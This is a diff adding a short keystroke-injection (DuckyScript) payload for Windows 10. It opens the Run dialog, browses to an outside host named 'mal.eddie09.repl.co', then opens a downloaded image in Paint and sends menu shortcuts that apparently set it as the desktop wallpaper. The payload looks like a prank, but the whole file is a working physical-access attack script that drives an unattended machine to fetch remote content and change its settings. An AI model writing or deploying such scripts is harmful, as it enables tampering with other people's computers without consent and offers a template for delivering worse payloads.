@@ -1,0 +1,21 @@
+REM AUTHOR: Eddie Devine
+REM TARGET: Windows 10
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c start https://mal.eddie09.repl.co
+ENTER
+DELAY 3000
+CONTROL w
+GUI r
+DELAY 500
+STRING mspaint C:\Users\%USERNAME%\Downloads\hotdog.jpg
+ENTER
+DELAY 1000
+ALT f
+DELAY 100
+STRING k
+DELAY 100
+STRING f
+ALT F4
